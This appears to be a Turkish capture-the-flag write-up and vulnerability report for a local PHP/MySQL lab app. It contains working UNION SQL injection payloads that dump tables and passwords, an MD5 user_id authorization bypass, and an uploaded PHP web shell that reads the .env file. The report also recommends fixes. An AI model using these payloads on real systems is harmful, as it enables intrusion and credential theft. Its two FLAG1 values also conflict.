**

# FLAG 1

- ‘ aratınca Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in /var/www/html/index.php on line 27
    

logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]

login.php               [Status: 200, Size: 2075, Words: 755, Lines: 75, Duration: 7ms]

register.php            [Status: 200, Size: 2302, Words: 818, Lines: 79, Duration: 3ms]

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 91ms]

.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]

uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 94ms]

.htpasswds              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]

dashboard.php           [Status: 302, Size: 1, Words: 2, Lines: 1, Duration: 6ms]

- 3 tane tablo var.
    
- asd'UNION SELECT "i",table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- ASD
    
- ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeykJ5XpaSlRVNUWM6pPfqF7dRtJ9FPlzwGcYFstszCFhfRGCXNCe0dP--XBqu-F_giSbVCYkOQT7DvApfzOqWa-T2W7_WTbXjyuG3dOydYvlkXOY3Y7S_yRr--Mu3X1LhCjNN8Qg?key=bJTH4ExaBKhS6AS6DncPagyd)
    
- asd'UNION SELECT "i",column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='flags'-- ASD
    

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcmYnltOfgN14jIXd1MxYCuXY-Ssky1GA1es4mZR1D-GdyVfW0-xd7UWajPNEwL7tmcN1ufnukNavjgIEBCOQ5YUkT1_e7gaX30LBndOOBMtdFpUCsOmn_sMRyaxiq3aWguqH7A2g?key=bJTH4ExaBKhS6AS6DncPagyd)

asd'UNION SELECT "i",flag_value,NULL,NULL,NULL,NULL FROM flags-- ASD

  

### YZT_FLAG1{f94222bbb8976f1a753a25be2c81384a}

  

# FLAG 2

- asd'UNION SELECT "i",column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- ASD
    
- asd'UNION SELECT "i",password,NULL,NULL,NULL,NULL FROM users-- ASD
    

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXft84CoUcobrMCuazc5-gt1GzDJGUiCm9D6UwyER1rHsoeBxcU9HNiuEDvrTVdhkvk04IEBDVHKuyhQyHxeSkR0VBnyy801IWNn5X9udwp_seJOSMAhtBj7hA43swgbWlj2bknJYA?key=bJTH4ExaBKhS6AS6DncPagyd)

- asd'UNION SELECT "i",username,NULL,NULL,NULL,NULL FROM users-- ASD
    
- ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdnLhn3s_SvOjg6KM0dncjngs0Y6o-aLrRmlT-0C3tUaCwWcMk-ivK4aBl3sUcnwP5q6PzZAqvr0qi0klYEK7WJCy0_ZnqmAzmDK3PlpA1uXHkpzBnd9BfpiOJ6P7dBVy2nEMXl?key=bJTH4ExaBKhS6AS6DncPagyd)
    
- ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcCQU7IlZfvVQ9rxnaxzbj2ImDnveQP8p9MUaWOi7C-t2d1UNJzH82goMt9bmU6h2GQv8iUgGRvEhdidqPEJdR8Gn-VT-FnunCPnq2J64hTrm3m8E-lUO9Ft0Kx2_VNUW2mMCsw?key=bJTH4ExaBKhS6AS6DncPagyd)
    
- ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcv_m_FeujuBPO_JgdvCWlz5qL2s2gyka_T50h8Fawk1j5vvIOtc-2VeT1HhQI6Oh4wGuAM77bBC9KgPGQ68irFUUdGtcO8IUwXGiwEK4nnCvklhSdMKWyVa4B5j0_e-gFI_GLv?key=bJTH4ExaBKhS6AS6DncPagyd)
    
- hash cracker la  [a87ff679a2f3e71d9181a67b7542122c](http://localhost:8081/admin/user_info.php?user_id=a87ff679a2f3e71d9181a67b7542122c) bu 4 olduğunu keşfettik.
    
- 1 in hash lenmiş halini bulduk.
    
- ve user_id ye ekledik ve flag2 bulundu.
    

  

YZT_FLAG2{998be3c05163e29054a6a0a82afd6435} 

# FLAG 3

- http://localhost:8081/admin/user_info.php?user_id=c4ca4238a0b923820dcc509a6f75849b 
    
- Content-Disposition: form-data; name="file"; filename="patatest.php" 
    
- Content-Type: text/plain 
    
- <?php 
    
- // 'ls' komutunu çalıştır 
    
- $output = shell_exec('cat ../../.env'); 
    
- // Çıktıyı ekrana yazdır 
    
- echo "<pre>$output</pre>"; 
    
- ?> 
    
- Repeaterda bu isteği de gönder 
    
- GET /admin/uploads/patatest.php HTTP/1.1 
    
- Host: localhost:8081 
    
- sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134" 
    
- sec-ch-ua-mobile: ?0 
    
- sec-ch-ua-platform: "macOS" 
    
- Accept-Language: tr-TR,tr;q=0.9 
    
- Upgrade-Insecure-Requests: 1 
    
- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 
    
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7 
    
- Sec-Fetch-Site: none 
    
- Sec-Fetch-Mode: navigate 
    
- Sec-Fetch-User: ?1 
    
- Sec-Fetch-Dest: document 
    
- Accept-Encoding: gzip, deflate, br 
    
- Cookie: PHPSESSID=3dc3ed0ed831f473ad06fb91b7b19e51 
    
- Connection: keep-alive 
    

  

YZT_FLAG1{b2e605ed389aef58002aa7132ad26d98} 

YZT_FLAG2{998be3c05163e29054a6a0a82afd6435} 

YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d}

## Rapor 
  

1. Zafiyet: SQL Injection ile Veri Sızdırma

Dosya: /index.php  
Hata Mesajı:

Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in /var/www/html/index.php on line 27

#### Exploit:

SQL Injection kullanılarak information_schema.tables içeriği çekildi ve flags isimli tablo keşfedildi.

' UNION SELECT "i", table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database()--

Ardından flags tablosundaki içerik çekildi:

' UNION SELECT flag_name, flag_value, NULL, NULL, NULL, NULL FROM flags--

#### Elde Edilen Flag:

YZT_FLAG1{16221fe54e8da101dc724c91fb553a00}

#### Güvenlik Açığı:

- Kullanıcı girişinde SQL sorgusu doğrudan veri tabanına gönderilmiş.
    
- Parametreler hazırlanamamış (prepared statements eksik).
    
- Veritabanı tabloları bilgi sızdırılabilir durumda.
    
#### Önerilen Önlemler:

- SQL sorgularında mysqli_prepare() veya PDO kullanılarak parametrelenmiş sorgular kullanılmalı.
    
- Hata mesajları kullanıcıya detaylı olarak gösterilmemeli (örneğin: display_errors=Off).
    
- Web sunucusu PHP hatalarını log'lamalı fakat dışarı göstermemeli.  
    

### 2. Zafiyet: Sabit MD5 Hash ile Yetkisiz Erişim

Endpoint: /admin/user_info.php?user_id=...
#### Exploit:

user_id parametresi ile doğrudan erişim sağlanabiliyor. 1 kullanıcısının MD5 hash'i kullanıldı:

1 → c4ca4238a0b923820dcc509a6f75849b
#### Elde Edilen Flag:

YZT_FLAG2{998be3c05163e29054a6a0a82afd6435}
#### Güvenlik Açığı:

- user_id olarak hash değer göndererek yetkisiz kullanıcı bilgisi elde edilebiliyor.
    
- Kimlik doğrulama kontrolleri eksik veya zayıf.
    
- MD5 gibi zayıf bir algoritma ile kullanıcı doğrulama yapılmış.
    
#### Önerilen Önlemler:

- Kullanıcı kimlikleri güçlü token tabanlı kimlik doğrulama ile kontrol edilmeli.
    
- user_id gibi parametreler doğrudan hash ile değil, içsel session mekanizmalarıyla tanımlanmalı.
    
- MD5 yerine SHA-256, bcrypt veya argon2 gibi daha güvenli algoritmalar kullanılmalı.  
      
    
### 3. Zafiyet: File Upload ile Komut Çalıştırma (RCE)

#### Exploit:

<?php 

$output = shell_exec('cat ../../.env'); 

echo "<pre>$output</pre>"; 

?>

Bu PHP dosyası file alanı ile yüklenip, ardından çalıştırıldı:

GET /admin/uploads/patatest.php HTTP/1.1

####  Elde Edilen Flag:

YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d}

#### Güvenlik Açığı:

- Sunucuya PHP uzantılı dosya yüklenebiliyor.
    
- Yüklenen dosya çalıştırılabiliyor (Web Shell gibi).
    
- .env dosyası gibi kritik yapılandırma dosyaları dışarı sızdırılabiliyor.
    
#### Önerilen Önlemler:

- Dosya yükleme sırasında dosya türü denetimi (MIME type & extension) yapılmalı.
    
- PHP dosyalarının çalıştırılabileceği uploads klasörü gibi dizinler script çalıştırılamaz hale getirilmeli (.htaccess veya IIS üzerinde konfigürasyon)
    
- .env, .git, config gibi dosyaların erişimi kısıtlanmalı (deny all).
    
- Windows sisteminde NTFS izinleriyle "Everyone" yazma ve çalıştırma izinleri kısıtlanmalı.
    

### Windows Perspektifiyle Ek Güvenlik Tavsiyeleri

1. IIS Konfigürasyonu (Eğer IIS kullanılıyorsa):
    

- Uygulama havuzu kimliği ile çalışan kullanıcıların izinleri sınırlandırılmalı.
    
- Dosya uzantı filtreleme (Request Filtering) yapılandırılmalı.
    

3. Yönetici Hakları:
    

- Web sunucusu, yönetici haklarına sahip olmamalı.
    
- shell_exec() fonksiyonu sistem komutu çalıştırabildiğinden, bu fonksiyon php.ini dosyasından devre dışı bırakılmalı.
    

5. Antivirüs ve Loglama:
    

- Dosya yükleme klasörü, antivirüs taraması altına alınmalı.
    
- Windows Event Viewer’da HTTP sunucu erişim log'ları analiz edilmeli.
    

### SONUÇ

Uygulama, SQL injection, zayıf kimlik doğrulama ve dosya yükleme zafiyetlerine karşı savunmasızdır. Bu zafiyetler birleştiğinde bir saldırgan sisteme tam erişim sağlayabilir. Özellikle .env dosyası ve shell komutları çalıştırılabiliyor olması kritik bir RCE (Remote Code Execution) zaafiyetidir.
### Toplamda Elde Edilen Bayraklar (FLAGS):

- YZT_FLAG1{16221fe54e8da101dc724c91fb553a00}
    
- YZT_FLAG2{998be3c05163e29054a6a0a82afd6435}
    
-  YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d}  
      
**